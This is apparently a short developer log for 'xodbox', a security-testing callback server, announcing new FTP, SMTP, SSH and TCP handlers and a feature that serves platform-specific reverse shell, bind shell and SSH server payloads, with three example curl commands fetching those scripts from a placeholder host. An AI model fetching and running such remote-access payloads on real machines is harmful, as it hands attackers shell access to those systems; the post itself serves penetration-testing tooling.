---
title: Moar protocols and simple payloads
date: 2025-07-04
description: New doc site and golang version
categories: [xodbox]
tags: [dev log]
---

I have stubbed out a handful of protocols. I have been using them and watching the logs. I still need to finalize how web hok alerts are triggered and what information those alerts should contain.

The new protocols are:

- FTP
- SMTP
- SSH
- TCP

Check out the [handlers documentation section](/docs/pkg/handlers/).

I have also been working on a way to remote access payloads to machines. I often find my self needing to custom build a
reverse shell for various operating systems and architectures. With this update, it is now possible to get a reverse, 
bind, or ssh server custom-built for whatever platform is requesting it. Examples:

```bash
curl xodbox.example/bind.sh
curl xodbox.example/ssh.sh
curl xodbox.example/reverse.sh
```

For more information see the [in development seeds](/docs/pkg/handlers/httpx/seeds/in-dev/) and [MDaaS docs](/docs/pkg/mdaas/)

If you are having problems, please [file an issue](https://github.com/defektive/xodbox/issues) on GitHub. I will do my best to fic the problem or provide a workaround.

Thanks!